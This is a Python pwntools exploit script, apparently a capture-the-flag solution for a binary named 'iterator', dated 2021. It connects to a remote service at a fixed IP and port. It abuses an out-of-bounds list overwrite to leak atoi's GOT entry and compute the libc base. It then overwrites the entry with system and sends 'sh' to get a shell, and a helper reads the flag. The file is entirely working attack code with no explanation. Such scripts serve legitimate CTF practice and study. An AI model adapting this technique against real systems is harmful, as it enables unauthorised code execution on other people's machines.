# -*- encoding: utf-8 -*-
import sys 
import os 
from pwn import * 
# context.update( os = 'linux', arch = 'amd64',timeout = 1)
binary = './iterator'
os.system('chmod +x %s'%binary)
elf = ELF(binary)
libc = elf.libc
# libc = ELF('')
context.binary = binary
DEBUG = 0
if DEBUG:
    libc = elf.libc
    context.log_level = 'debug' 
    p = process(binary)
    # p = process(['qemu-arm', binary])
    # p = process(['qemu-arm', binary,'-g','1234'])
    # p = process(['qemu-aarch64','-L','','-g','1234',binary])
else:
    host = '47.106.172.144'
    port = '65001'
    p = remote(host,port)

l64 = lambda            : u64(p.recvuntil('\x7f')[-6:].ljust(8,'\x00'))
uu64= lambda a          : u64(p.recv(a).ljust(8,'\x00'))
l32 = lambda            : u32(p.recvuntil('\xf7')[-4:].ljust(4,'\x00'))
sla = lambda a,b        : p.sendlineafter(str(a),str(b))
sa  = lambda a,b        : p.sendafter(str(a),str(b))
lg  = lambda name,data  : p.success(name + ': \033[1;36m 0x%x \033[0m' % data)
se  = lambda payload    : p.send(payload)
rl  = lambda            : p.recv()
sl  = lambda payload    : p.sendline(payload)
ru  = lambda a          : p.recvuntil(str(a))
rint= lambda x = 12     : int( p.recv(x) , 16)

def getShell():
    sl('exec 1>&0')
    sl('echo shell')
    ru('shell')
    p.success('Get Shell')
    sl('cat flag')
    ru('flag')
    flag = rl()
    return ('flag' + flag)

def dbg( b = null):
    if (b == null):
        gdb.attach(p)
        pause()
    else:
        gdb.attach(p,'b %s'%b)

def boom( pwn ):
    global p
    i = 0
    while 1 :
        try:
            i+=1
            pwn()
        except:
            lg('times ======== > ',i)
            p.close()
            if (DEBUG):
                p = process(binary)
            else :
                p = remote(host,port)

def one_gadget(filename):
    log.success('Leak One_Gadgets...')
    one_ggs = str(subprocess.check_output(['one_gadget','--raw', '-f',filename])).split(' ')
    return list(map(int,one_ggs))

def cmd(num):
    sla('>',num)

def add(count):
    cmd(1)
    sla('count:',count)

def overwrite( id, start , end ,nums):
    cmd(4)
    sla('List id:',id)
    sla('Star id:',start)
    sla('End id:',end)
    sla('New number:',nums)

def edit(idx , item , num):
    cmd(3)
    sla('List id:',idx)
    sla('Item id:',item)
    sla('New number:',num)

def show(idx , item ):
    cmd(2)
    sla('List id:',idx)
    sla('Item id:',item)


# one_gad = one_gadget(libc.path)

def attack():
    
    atoi_got = elf.got['atoi']

    add(2)
    add(2)
    
    overwrite(0 , 4 , 4 , atoi_got)
    show(1,0)
    
    ru('Number: ')
    addr = int(p.recv(len('140041558260128'))) 

    lg('addr',addr)
    libc.address = addr - libc.sym['atoi']
    system_addr = libc.sym['system']

    lg('system_addr',system_addr)

    edit(1 , 0 , system_addr)
    cmd('sh\x00')

    # dbg()
    
    # p.success(getShell())
    p.interactive()

attack()

'''
@File    :   iterator.py
@Time    :   2021/12/04 10:35:35
@Author  :   Niyah 
'''